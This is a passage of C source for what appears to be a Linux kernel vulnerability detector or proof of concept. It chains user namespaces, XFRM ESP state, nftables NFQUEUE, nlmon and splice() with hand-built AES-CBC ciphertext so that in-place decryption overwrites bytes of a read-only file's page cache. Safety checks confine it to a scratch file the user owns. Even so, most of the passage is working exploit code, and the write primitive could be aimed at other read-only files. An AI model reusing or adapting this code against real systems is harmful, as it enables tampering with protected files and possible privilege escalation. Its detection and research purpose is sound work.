	       g_scratch_path, SCRATCH_SIZE, TARGET_OFF, WINDOW_OFF,
	       WINDOW_OFF + WINDOW_LEN);
	printf("TARGET_FILE uid=%u gid=%u mode=0444 size=%u non_executable=1\n",
	       (unsigned)st.st_uid, (unsigned)st.st_gid, SCRATCH_SIZE);
	printf("TARGET_WINDOW_BEFORE (%u bytes):\n", WINDOW_LEN);
	hexdump_lines(window, WINDOW_LEN);
	printf("TARGET_SHA256_BEFORE=%s\n", hex);

	if (memcmp(window + 16, MARKER, TARGET_BYTES) == 0)
		fail("scratch pattern collision with MARKER - refusing");
}

/* ================================================================== */
/* Stage 2: user + network namespace                                   */
/* ================================================================== */

static void write_file_line(const char *path, const char *text)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) {
		if (errno == ENOENT && strcmp(path, "/proc/self/setgroups") == 0)
			return;   /* pre-3.19 kernels have no setgroups file */
		fail("open %s", path);
	}
	if (write_all(fd, text, strlen(text)) < 0)
		fail("write %s", path);
	close(fd);
}

static void enter_namespaces(void)
{
	char map[64];
	struct stat st;
	int fd;

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		printf("DETECTOR-RESULT: SKIPPED (no unprivileged user namespaces, errno=%d %s)\n",
		       errno, strerror(errno));
		exit(EXIT_SKIPPED);
	}

	write_file_line("/proc/self/setgroups", "deny");
	snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)g_ruid);
	fd = open("/proc/self/uid_map", O_WRONLY);
	if (fd < 0 || write_all(fd, map, strlen(map)) < 0)
		fail("write uid_map");
	close(fd);
	snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)g_egid);
	fd = open("/proc/self/gid_map", O_WRONLY);
	if (fd < 0 || write_all(fd, map, strlen(map)) < 0)
		fail("write gid_map");
	close(fd);
	if (setresgid(0, 0, 0) < 0 || setresuid(0, 0, 0) < 0)
		fail("setresuid/gid 0 in userns");

	probe("USERNS unshare=OK userns_uid=0 netns=fresh (mapped from uid %u)",
	      (unsigned)g_ruid);

	/* Re-verify ownership inside the namespace (mapped view). */
	if (stat(g_dir, &st) < 0 || st.st_uid != geteuid())
		fail("SAFETY ABORT: scratch dir ownership not verifiable in userns");
	if (stat(g_scratch_path, &st) < 0 || st.st_uid != geteuid())
		fail("SAFETY ABORT: scratch ownership not verifiable in userns");
	if (stat(g_vector_path, &st) < 0 || st.st_uid != geteuid())
		fail("SAFETY ABORT: vector ownership not verifiable in userns");
}

/* ================================================================== */
/* Stage 3: link + sysctl + nlmon + XFRM                               */
/* ================================================================== */

static void if_up(const char *name)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0)
		fail("socket for ioctl");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", name);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0)
		fail("SIOCGIFFLAGS %s", name);
	ifr.ifr_flags |= (short)(IFF_UP | IFF_RUNNING);
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
		fail("SIOCSIFFLAGS %s (missing device/driver?)", name);
	close(s);
}

static void create_nlmon0(int rt_fd)
{
	struct nb nb;
	unsigned char buf[512];
	struct ifinfomsg *ifi;
	size_t m, nest;

	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb, RTM_NEWLINK,
			 NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
			 (void **)&ifi, sizeof(*ifi));
	ifi->ifi_family = AF_UNSPEC;
	nla_put_strz(&nb, IFLA_IFNAME, "nlmon0");
	nest = nest_begin(&nb, IFLA_LINKINFO);
	nla_put_strz(&nb, IFLA_INFO_KIND, "nlmon");
	nest_end(&nb, nest);
	nb_msg_end(&nb, m);
	nl_send_buffer(rt_fd, &nb);
	nl_wait_ack(rt_fd, "RTM_NEWLINK nlmon0");
}

static void xfrm_add_sa_policy(void)
{
	struct nb nb;
	unsigned char buf[1024];
	struct xfrm_usersa_info *sa;
	struct xfrm_userpolicy_info *pi;
	int fd;
	size_t m;
	uint32_t loopback = htonl(INADDR_LOOPBACK);

	/* xfrm_algo_auth / xfrm_algo payloads, byte-exact. */
	uint8_t aa[64 + 4 + 4 + AUTH_KEY_LEN] __attribute__((aligned(8)));
	uint8_t ac[64 + 4 + AES_KEY_LEN] __attribute__((aligned(8)));
	uint8_t tb[sizeof(struct xfrm_user_tmpl)] __attribute__((aligned(8)));

	fd = nl_socket(NETLINK_XFRM);

	memset(aa, 0, sizeof(aa));
	memcpy(aa, "hmac(sha256)", 13);
	{
		uint32_t kv = AUTH_KEY_LEN * 8;   /* key length in bits   */
		uint32_t tv = ICV_BITS;           /* truncation in bits   */
		memcpy(aa + 64, &kv, 4);
		memcpy(aa + 68, &tv, 4);
	}
	memcpy(aa + 72, AUTH_KEY, AUTH_KEY_LEN);

	memset(ac, 0, sizeof(ac));
	memcpy(ac, "cbc(aes)", 9);
	{
		uint32_t kv = AES_KEY_LEN * 8;
		memcpy(ac + 64, &kv, 4);
	}
	memcpy(ac + 68, ENC_KEY, AES_KEY_LEN);

	/* --- Security Association (state) --- */
	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb, XFRM_MSG_NEWSA, NLM_F_REQUEST | NLM_F_ACK,
			 (void **)&sa, sizeof(*sa));
	sa->sel.family = AF_INET;
	sa->sel.prefixlen_d = 32;
	sa->sel.prefixlen_s = 32;
	sa->sel.daddr.a4 = loopback;
	sa->sel.saddr.a4 = loopback;
	sa->id.daddr.a4 = loopback;
	sa->id.spi = htonl(ESP_SPI);
	sa->id.proto = IPPROTO_ESP;
	sa->saddr.a4 = loopback;
	sa->lft.soft_byte_limit = ~0ULL;
	sa->lft.hard_byte_limit = ~0ULL;
	sa->lft.soft_packet_limit = ~0ULL;
	sa->lft.hard_packet_limit = ~0ULL;
	sa->lft.soft_add_expires_seconds = ~0ULL;
	sa->lft.hard_add_expires_seconds = ~0ULL;
	sa->lft.soft_use_expires_seconds = ~0ULL;
	sa->lft.hard_use_expires_seconds = ~0ULL;
	sa->family = AF_INET;
	sa->mode = XFRM_MODE_TRANSPORT;
	sa->replay_window = 0;   /* single-shot oracle; seq reuse is fine */
	nla_put_raw(&nb, XFRMA_ALG_AUTH_TRUNC, aa, sizeof(aa));
	nla_put_raw(&nb, XFRMA_ALG_CRYPT, ac, sizeof(ac));
	nb_msg_end(&nb, m);
	nl_send_buffer(fd, &nb);
	nl_wait_ack(fd, "XFRM_MSG_NEWSA");

	/* --- Policy (dir=in) with template --- */
	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb, XFRM_MSG_NEWPOLICY, NLM_F_REQUEST | NLM_F_ACK,
			 (void **)&pi, sizeof(*pi));
	pi->sel.family = AF_INET;
	pi->sel.prefixlen_d = 32;
	pi->sel.prefixlen_s = 32;
	pi->sel.daddr.a4 = loopback;
	pi->sel.saddr.a4 = loopback;
	pi->lft.soft_byte_limit = ~0ULL;
	pi->lft.hard_byte_limit = ~0ULL;
	pi->lft.soft_packet_limit = ~0ULL;
	pi->lft.hard_packet_limit = ~0ULL;
	pi->lft.soft_add_expires_seconds = ~0ULL;
	pi->lft.hard_add_expires_seconds = ~0ULL;
	pi->lft.soft_use_expires_seconds = ~0ULL;
	pi->lft.hard_use_expires_seconds = ~0ULL;
	pi->priority = 0;
	pi->dir = XFRM_POLICY_IN;
	pi->action = XFRM_POLICY_ALLOW;
	pi->share = XFRM_SHARE_ANY;
	memset(tb, 0, sizeof(tb));
	{
		struct xfrm_user_tmpl *t = (struct xfrm_user_tmpl *)(void *)tb;
		t->id.daddr.a4 = loopback;
		t->id.spi = htonl(ESP_SPI);
		t->id.proto = IPPROTO_ESP;
		t->saddr.a4 = loopback;
		t->mode = XFRM_MODE_TRANSPORT;
		t->aalgos = ~0u;
		t->ealgos = ~0u;
		t->calgos = ~0u;
	}
	nla_put_raw(&nb, XFRMA_TMPL, tb, sizeof(tb));
	nb_msg_end(&nb, m);
	nl_send_buffer(fd, &nb);
	nl_wait_ack(fd, "XFRM_MSG_NEWPOLICY");
	close(fd);

	probe("XFRM state=127.0.0.1-esp-0x%x-transport policy=dir_in auth=hmac(sha256)-%u enc=cbc(aes) esn=no replay_window=0",
	      ESP_SPI, ICV_BITS);
}

static void net_setup(void)
{
	int rt_fd = nl_socket(NETLINK_ROUTE);

	if_up("lo");
	write_file_line("/proc/sys/net/ipv4/conf/lo/route_localnet", "1\n");
	write_file_line("/proc/sys/net/ipv4/conf/lo/accept_local", "1\n");
	probe("SYSCTL lo/route_localnet=1 lo/accept_local=1");

	create_nlmon0(rt_fd);
	if_up("nlmon0");
	probe("IP_LINK lo=up nlmon0=up");

	xfrm_add_sa_policy();
	close(rt_fd);
}

/* ================================================================== */
/* Stage 4: nftables NFQUEUE rule                                      */
/* ================================================================== */

static void nft_queue_rule(void)
{
	struct nb nb;
	unsigned char buf[2048];
	struct nfgenmsg *nfg;
	size_t m, hook, exprs, elem, data;
	int fd, acks;

	fd = nl_socket(NETLINK_NETFILTER);
	nb_init(&nb, buf, sizeof(buf));

	/* batch begin */
	m = nb_msg_begin(&nb, NFNL_MSG_BATCH_BEGIN, NLM_F_REQUEST,
			 (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(NFNL_SUBSYS_NFTABLES);
	nb_msg_end(&nb, m);

	/* table */
	m = nb_msg_begin(&nb,
			 (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE),
			 NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
			 (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_IPV4;
	nfg->version = NFNETLINK_V0;
	nla_put_strz(&nb, NFTA_TABLE_NAME, "zdiaudit");
	nb_msg_end(&nb, m);

	/* base chain on LOCAL_OUT */
	m = nb_msg_begin(&nb,
			 (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN),
			 NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
			 (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_IPV4;
	nfg->version = NFNETLINK_V0;
	nla_put_strz(&nb, NFTA_CHAIN_TABLE, "zdiaudit");
	nla_put_strz(&nb, NFTA_CHAIN_NAME, "outq");
	nla_put_strz(&nb, NFTA_CHAIN_TYPE, "filter");
	hook = nest_begin(&nb, NFTA_CHAIN_HOOK);
	nla_put_u32be(&nb, NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_OUT);
	nla_put_u32be(&nb, NFTA_HOOK_PRIORITY, 0);
	nest_end(&nb, hook);
	nb_msg_end(&nb, m);

	/* rule: queue 0 */
	m = nb_msg_begin(&nb,
			 (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE),
			 NLM_F_REQUEST | NLM_F_CREATE | NLM_F_APPEND | NLM_F_ACK,
			 (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = NFPROTO_IPV4;
	nfg->version = NFNETLINK_V0;
	nla_put_strz(&nb, NFTA_RULE_TABLE, "zdiaudit");
	nla_put_strz(&nb, NFTA_RULE_CHAIN, "outq");
	exprs = nest_begin(&nb, NFTA_RULE_EXPRESSIONS);
	elem = nest_begin(&nb, NFTA_LIST_ELEM);
	nla_put_strz(&nb, NFTA_EXPR_NAME, "queue");
	data = nest_begin(&nb, NFTA_EXPR_DATA);
	nla_put_u16be(&nb, NFTA_QUEUE_NUM, 0);
	nest_end(&nb, data);
	nest_end(&nb, elem);
	nest_end(&nb, exprs);
	nb_msg_end(&nb, m);

	/* batch end */
	m = nb_msg_begin(&nb, NFNL_MSG_BATCH_END, NLM_F_REQUEST,
			 (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(NFNL_SUBSYS_NFTABLES);
	nb_msg_end(&nb, m);

	nl_send_buffer(fd, &nb);
	acks = 0;
	while (acks < 3) {
		nl_wait_ack(fd, "nft batch");
		acks++;
	}
	probe("NFT_QUEUE_SETUP table=zdiaudit chain=outq hook=LOCAL_OUT queue=0 acks=%d",
	      acks);
	close(fd);
}

/* ================================================================== */
/* Stage 5: NFQUEUE consumer socket                                    */
/* ================================================================== */

static int g_qfd = -1;

static void nfq_bind_config(void)
{
	struct nb nb;
	unsigned char buf[512];
	struct nfgenmsg *nfg;
	struct nfqnl_msg_config_cmd cmd;
	uint8_t params[5];   /* struct nfqnl_msg_config_params is packed */
	size_t m;
	int rcvbuf = 1 << 20;

	g_qfd = nl_socket(NETLINK_NETFILTER);
	setsockopt(g_qfd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

	memset(&cmd, 0, sizeof(cmd));
	cmd.command = NFQNL_CFG_CMD_BIND;
	cmd.pf = htons(AF_INET);

	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb,
			 (uint16_t)((NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG),
			 NLM_F_REQUEST | NLM_F_ACK, (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(0);
	nla_put_raw(&nb, NFQA_CFG_CMD, &cmd, sizeof(cmd));
	nb_msg_end(&nb, m);
	nl_send_buffer(g_qfd, &nb);
	nl_wait_ack(g_qfd, "NFQNL_CFG_CMD_BIND");

	memset(params, 0, sizeof(params));
	params[0] = (uint8_t)(65535 >> 24);      /* copy_range = 65535, BE   */
	params[1] = (uint8_t)(65535 >> 16);
	params[2] = (uint8_t)(65535 >> 8);
	params[3] = (uint8_t)65535;
	params[4] = NFQNL_COPY_PACKET;

	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb,
			 (uint16_t)((NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_CONFIG),
			 NLM_F_REQUEST | NLM_F_ACK, (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(0);
	nla_put_raw(&nb, NFQA_CFG_PARAMS, params, sizeof(params));
	nla_put_u32be(&nb, NFQA_CFG_FLAGS, NFQA_CFG_F_GSO | NFQA_CFG_F_UID_GID);
	nla_put_u32be(&nb, NFQA_CFG_MASK, NFQA_CFG_F_GSO | NFQA_CFG_F_UID_GID);
	nb_msg_end(&nb, m);
	nl_send_buffer(g_qfd, &nb);
	nl_wait_ack(g_qfd, "NFQNL_COPY_PACKET config");

	probe("NFQUEUE_BIND queue=0 copy_mode=NFQNL_COPY_PACKET copy_range=65535 flags=GSO|UID_GID");
}

/* Receive one NFQNL_MSG_PACKET (skipping acks); fills in the geometry.
 * Returns the packet id. */
static uint32_t nfq_recv_packet(unsigned char *msg, size_t msgcap,
				size_t *msglen, unsigned *p0,
				unsigned *payload_len, unsigned timeout_ms)
{
	struct timeval tv;

	tv.tv_sec = timeout_ms / 1000u;
	tv.tv_usec = (suseconds_t)(timeout_ms % 1000u) * 1000;
	setsockopt(g_qfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

	for (;;) {
		ssize_t n = recv(g_qfd, msg, msgcap, 0);
		struct nlmsghdr *h;
		struct nfgenmsg *nfg;
		struct nlattr *a;
		size_t rem;
		uint32_t id = 0;

		if (n < 0)
			fail("NFQUEUE recv (packet never queued?)");
		if ((size_t)n < sizeof(struct nlmsghdr))
			continue;
		h = (struct nlmsghdr *)msg;
		if (h->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(h);
			if (e->error != 0) {
				errno = -e->error;
				fail("NFQUEUE socket error");
			}
			continue;   /* stray ack */
		}
		if (h->nlmsg_type !=
		    (uint16_t)((NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_PACKET))
			continue;

		*msglen = (size_t)h->nlmsg_len;
		nfg = (struct nfgenmsg *)NLMSG_DATA(h);
		a = (struct nlattr *)((unsigned char *)nfg +
				      NLMSG_ALIGN(sizeof(*nfg)));
		rem = NLMSG_PAYLOAD(h, sizeof(*nfg));
		*p0 = 0;
		*payload_len = 0;
		while (rem >= sizeof(*a) && a->nla_len >= sizeof(*a) &&
		       (size_t)a->nla_len <= rem) {
			unsigned t = a->nla_type & NLA_TYPE_MASK;
			if (t == NFQA_PACKET_HDR) {
				struct nfqnl_msg_packet_hdr *ph =
					(struct nfqnl_msg_packet_hdr *)NLA_DATA(a);
				id = ntohl(ph->packet_id);
			} else if (t == NFQA_PAYLOAD) {
				*p0 = (unsigned)((unsigned char *)NLA_DATA(a) -
						 (unsigned char *)msg);
				*payload_len = (unsigned)(a->nla_len - NLA_HDRLEN);
			}
			{
				size_t step = NLA_ALIGN(a->nla_len);
				if (step > rem)
					step = rem;
				a = (struct nlattr *)((unsigned char *)a + step);
				rem -= step;
			}
		}
		if (*p0 == 0)
			fail("queue message without NFQA_PAYLOAD");
		return id;
	}
}

static void nfq_send_verdict(uint32_t id)
{
	struct nb nb;
	unsigned char buf[256];
	struct nfgenmsg *nfg;
	struct nfqnl_msg_verdict_hdr vh;
	size_t m;

	memset(&vh, 0, sizeof(vh));
	vh.verdict = htonl(NF_ACCEPT);
	vh.id = htonl(id);

	nb_init(&nb, buf, sizeof(buf));
	m = nb_msg_begin(&nb,
			 (uint16_t)((NFNL_SUBSYS_QUEUE << 8) | NFQNL_MSG_VERDICT),
			 NLM_F_REQUEST, (void **)&nfg, sizeof(*nfg));
	nfg->nfgen_family = AF_UNSPEC;
	nfg->version = NFNETLINK_V0;
	nfg->res_id = htons(0);
	nla_put_raw(&nb, NFQA_VERDICT_HDR, &vh, sizeof(vh));
	nb_msg_end(&nb, m);
	nl_send_buffer(g_qfd, &nb);
}

/* ================================================================== */
/* Splice-backed UDP sender + inner receiver                           */
/* ================================================================== */

static int g_inner = -1;

static void inner_bind(void)
{
	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((uint16_t)PROBE_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	g_inner = socket(AF_INET, SOCK_DGRAM, 0);
	if (g_inner < 0)
		fail("inner socket");
	if (bind(g_inner, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		fail("bind inner receiver :%u", PROBE_PORT);
}

static void splice_exact(int in, off_t *off, int out, size_t len)
{
	size_t done = 0;
	while (done < len) {
		ssize_t n = splice(in, off, out, NULL, len - done, 0);
		if (n <= 0)
			fail("splice (n=%zd)", n);
		done += (size_t)n;
	}
}

static void splice_exact_out(int in, int out, size_t len)
{
	size_t done = 0;
	while (done < len) {
		ssize_t n = splice(in, NULL, out, NULL, len - done, 0);
		if (n <= 0)
			fail("splice out (n=%zd)", n);
		done += (size_t)n;
	}
}

/* Send one UDP datagram to 127.0.0.1:PROBE_PORT whose payload is entirely
 * splice()-backed: TARGET_BYTES bytes from the scratch file at TARGET_OFF,
 * then `vlen` bytes from the vector file at offset 0.  The skb the kernel
 * builds therefore has a 28-byte linear head (IPv4+UDP headers) and page
 * frag references to the scratch and vector page-cache pages. */
static void send_spliced_via(int scratch_ro, int vector_ro, size_t vlen)
{
	struct sockaddr_in addr;
	int tx, pfd[2];
	off_t toff = (off_t)TARGET_OFF, voff = 0;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons((uint16_t)PROBE_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	tx = socket(AF_INET, SOCK_DGRAM, 0);
	if (tx < 0)
		fail("sender socket");
	if (connect(tx, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		fail("connect sender");
	if (pipe(pfd) < 0)
		fail("pipe");
	splice_exact(scratch_ro, &toff, pfd[1], TARGET_BYTES);
	splice_exact(vector_ro, &voff, pfd[1], vlen);
	close(pfd[1]);
	splice_exact_out(pfd[0], tx, TARGET_BYTES + vlen);
	close(pfd[0]);
	close(tx);
}

/* Drain datagrams; prints one line per datagram and returns how many
 * matched expect_len exactly. */
static int inner_drain(const char *tag, unsigned wait_ms, size_t expect_len)
{
	static uint8_t buf[70000];
	int matches = 0;
	int first = 1;
	struct timeval tv;

	tv.tv_sec = wait_ms / 1000u;
	tv.tv_usec = (suseconds_t)(wait_ms % 1000u) * 1000;
	setsockopt(g_inner, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	for (;;) {
		ssize_t n;
		if (first) {
			n = recv(g_inner, buf, sizeof(buf), 0);
			first = 0;
		} else {
			n = recv(g_inner, buf, sizeof(buf), MSG_DONTWAIT);
		}
		if (n < 0)
			break;
		printf("%s len=%zd\n", tag, n);
		if ((size_t)n == expect_len)
			matches++;
	}
	return matches;
}

/* ================================================================== */
/* Stage 6: probe packet - learn the netlink message geometry          */
/* ================================================================== */

static void run_probe(int scratch_ro)
{
	unsigned char msg[MAX_MSG];
	unsigned char window[WINDOW_LEN];
	size_t msglen, i;
	unsigned p0, plen, id;
	int vfd;

	inner_bind();

	vfd = open(g_vector_path, O_RDONLY);
	if (vfd < 0)
		fail("open vector RO (probe)");
	send_spliced_via(scratch_ro, vfd, PROBE_VEC_LEN);
	close(vfd);

	id = nfq_recv_packet(msg, sizeof(msg), &msglen, &p0, &plen, 3000);
	g_L = (unsigned)msglen;
	g_P0 = p0;

	probe("sent=%u nfq_msglen=%u packet_id=%u", TARGET_BYTES + PROBE_VEC_LEN,
	      g_L, id);

	/* frag_start = payload attr data + the 28-byte linear head copy.
	 * Matches the layout published in the ZDI transcript:
	 * frag=[96,104) vector=[104,618). */
	g_frag = p0 + UDP_PAYLOAD_LINEAR;
	{
		unsigned attrs = p0 - 24u;   /* nlmsghdr16 + nfgen4 + attrs */
		probe("layout nlmsghdr16+nfgenmsg4+attrs%u+PAYLOADnla4+linear_copy%u frag=[%u,%u) vector=[%u,%u)",
		      attrs, UDP_PAYLOAD_LINEAR, g_frag,
		      g_frag + TARGET_BYTES, g_frag + TARGET_BYTES,
		      (unsigned)msglen);
	}

	/* Sanity-check the payload copy: IPv4/UDP to :5555 with our bytes. */
	if (plen != 550u)
		fail("probe payload len %u != 550 (copy_range clamped?)", plen);
	if (msg[p0] != 0x45 || msg[p0 + 9] != 17)
		fail("probe payload is not the sent IPv4/UDP packet");
	{
		unsigned dport = ((unsigned)msg[p0 + 22] << 8) |
				 (unsigned)msg[p0 + 23];
		if (dport != PROBE_PORT)
			fail("probe payload dport %u unexpected", dport);
	}
	if (pread(scratch_ro, window, WINDOW_LEN, (off_t)WINDOW_OFF) !=
	    (ssize_t)WINDOW_LEN)
		fail("read scratch window");
	for (i = 0; i < TARGET_BYTES; i++)
		if (msg[p0 + UDP_PAYLOAD_LINEAR + i] != window[16 + i])
			fail("probe payload target bytes mismatch at %zu", i);

	nfq_send_verdict(id);
	sleep_ms(200);
	inner_drain("PROBE_ORIGINAL_UDP_RECEIVED", 300,
		    TARGET_BYTES + PROBE_VEC_LEN);
}

/* ================================================================== */
/* Stage 7: ESP frame construction (the layout math)                   */
/* ================================================================== */

/*
 * Compose the exact bytes the trigger netlink message must contain AFTER
 * tc pedit has rewritten its linear prefix, as one Ethernet frame:
 *
 *   [0,14)   Ethernet (dst/src zero, ethertype 0x0800)     - pedit
 *   [14,34)  IPv4 header, proto 50, src=dst=127.0.0.1      - pedit
 *   [34,42)  ESP header (SPI 0x100, seq 1)                 - pedit
 *   [42,58)  ESP IV (explicit CBC IV)                      - pedit
 *   [58,CT1) ESP ciphertext (NBLK AES blocks)              - pedit
 *              [58, frag)        linear, pedit-controlled
 *              [frag, frag+8)    the 8 fixed scratch-file bytes
 *              [frag+8, CT1)     vector-file bytes
 *   [CT1,M)  truncated HMAC-SHA256 ICV (16 bytes)          - vector tail
 *
 * The UDP payload is padded by g_d bytes so the ciphertext is a whole
 * number of AES blocks (the observed ZDI geometry needs d=0).
 *
 * CBC constraint: P_b = D(C_b) ^ C_{b-1}.  The 8 fixed ciphertext bytes
 * (the scratch file's) sit inside one or two blocks around index b0; every
 * desired plaintext byte is enforced through fully-writable neighbours:
 *   - block b0's plaintext via C_{b0-1} = D(C_b0) ^ P_b0 (then chained
 *     backward to C_0);
 *   - if the fixed region straddles a block boundary, block b0+1's marker
 *     bytes are enforced through the free LOW bytes of C_b0 (they always
 *     precede the fixed tail of C_b0 because the region is 8 <= 16 bytes
 *     and starts at frag, which ends block b0);
 *   - blocks after the fixed region via the forward chain
 *     C_b = E(P_b ^ C_{b-1}).
 * Finally the whole composition is decrypted with AF_ALG and compared
 * against the desired plaintext byte-for-byte (CRYPTO self-check).
 */
static void compose_esp_frame(const uint8_t target8[TARGET_BYTES])
{
	uint8_t *P, *C;
	unsigned ctlen, nblk, inner_len, t0, b0, b1, b, i;

	/* Geometry. */
	g_d = (unsigned)(((74 - (int)g_L) % 16 + 16) % 16);
	g_M = g_L + g_d;
	if (g_M > MAX_MSG - 64u)
		fail("message too large (%u)", g_M);
	if ((g_M - 74u) % 16u != 0u)
		fail("alignment math broken");
	if (g_frag < 74u || g_frag > 128u || (g_frag & 3u) != 0u)
		fail("unexpected frag_start=%u (kernel layout drift; aborting safely)",
		     g_frag);
	if (g_frag + TARGET_BYTES + 2u * BLK > g_M - ICV_LEN)
		fail("frag_start=%u leaves no room for ct blocks", g_frag);

	ctlen = g_M - ICV_LEN - CT0;         /* 544 for the ZDI geometry */
	nblk = ctlen / BLK;
	inner_len = ctlen - 16u;             /* ESP trailer is 16 bytes   */
	t0 = g_frag - CT0;                   /* target bytes index in P/C */
	b0 = t0 / BLK;
	b1 = (t0 + TARGET_BYTES - 1u) / BLK;
	if (b0 < 1 || b1 > nblk - 2)
		fail("fixed block placement out of range (t0=%u nblk=%u)", t0, nblk);
	if (t0 + TARGET_BYTES > inner_len)
		fail("marker would land outside inner packet data");
	g_inner_expect = inner_len - 8u;

	probe("LAYOUT msg_len=%u pad=%u ip_tot_len=%u ct_len=%u ct_blocks=%u icv_at=%u frag_start=%u",
	      g_M, g_d, g_M - ETH_HDR, ctlen, nblk, g_M - ICV_LEN, g_frag);

	P = calloc(1, ctlen);
	C = calloc(1, ctlen);
	if (!P || !C)
		fail("oom");

	/* Desired plaintext = inner UDP packet + ESP trailer. */
	P[0] = (uint8_t)(40000 >> 8); P[1] = (uint8_t)40000;    /* sport */
	P[2] = (uint8_t)(PROBE_PORT >> 8); P[3] = (uint8_t)PROBE_PORT;
	P[4] = (uint8_t)(inner_len >> 8); P[5] = (uint8_t)inner_len;
	P[6] = 0; P[7] = 0;                                     /* csum 0 */
	for (i = 8; i < inner_len; i++)
		P[i] = (uint8_t)('A' + (i % 26u));
	for (i = 0; i < 14u; i++)
		P[inner_len + i] = (uint8_t)(i + 1u);       /* RFC padding */
	P[inner_len + 14u] = 14u;                        /* padlen      */
	P[inner_len + 15u] = 17u;                        /* nexthdr=UDP */
	memcpy(P + t0, MARKER, TARGET_BYTES);

	/* Ciphertext: fixed scratch bytes + pattern elsewhere. */
	for (i = 0; i < ctlen; i++)
		C[i] = vector_byte(i);
	memcpy(C + t0, target8, TARGET_BYTES);

	alg_open_skcipher();

	/* Straddle fix-up: enforce block b0+1's marker bytes via the free
	 * low bytes of C_b0 (they lie strictly before the fixed tail). */
	if (b1 == b0 + 1u) {
		unsigned s = BLK - (t0 % BLK);     /* marker bytes in block b0 */
		unsigned k = TARGET_BYTES - s;     /* marker bytes in block b1 */
		uint8_t dv[BLK], cb1[BLK];
		memcpy(cb1, C + b1 * BLK, BLK);
		aes_dec_raw(cb1, dv);
		for (i = 0; i < k; i++)
			C[b0 * BLK + i] = dv[i] ^ MARKER[s + i];
	}

	/* Block b0's plaintext via C_{b0-1}; then chain backward to C_0. */
	{
		uint8_t dv[BLK], cb[BLK];
		memcpy(cb, C + b0 * BLK, BLK);
		aes_dec_raw(cb, dv);
		for (i = 0; i < BLK; i++)
			C[(b0 - 1u) * BLK + i] = dv[i] ^ P[b0 * BLK + i];
		for (b = b0 - 1u; b >= 1u; b--) {
			memcpy(cb, C + b * BLK, BLK);
			aes_dec_raw(cb, dv);
			for (i = 0; i < BLK; i++)
				C[(b - 1u) * BLK + i] = dv[i] ^ P[b * BLK + i];
			if (b == 1u)
				break;   /* unsigned loop guard */
		}
	}

	/* If the fixed region straddled, block b1's non-marker plaintext is
	 * determined by C_b0; patch the expectation so the self-check below
	 * compares against reality (marker bytes are enforced exactly). */
	if (b1 == b0 + 1u) {
		unsigned s = BLK - (t0 % BLK);
		unsigned k = TARGET_BYTES - s;
		uint8_t dv[BLK], cb1[BLK];
		memcpy(cb1, C + b1 * BLK, BLK);
		aes_dec_raw(cb1, dv);
		for (i = 0; i < BLK; i++)
			P[b1 * BLK + i] = dv[i] ^ C[b0 * BLK + i];
		for (i = 0; i < k; i++)
			P[b1 * BLK + i] = MARKER[s + i];
	}

	/* Forward chain after the fixed region. */
	for (b = b1 + 1u; b < nblk; b++) {
		uint8_t out[BLK];
		aes_enc_cbc(C + (b - 1u) * BLK, P + b * BLK, out);
		memcpy(C + b * BLK, out, BLK);
	}

	/* ---- compose the full message ---- */
	memset(g_full, 0, sizeof(g_full));
	g_full[12] = 0x08;
	g_full[13] = 0x00;
	g_full[ETH_HDR] = 0x45;
	g_full[ETH_HDR + 1] = 0x00;
	g_full[ETH_HDR + 2] = (uint8_t)((g_M - ETH_HDR) >> 8);
	g_full[ETH_HDR + 3] = (uint8_t)(g_M - ETH_HDR);
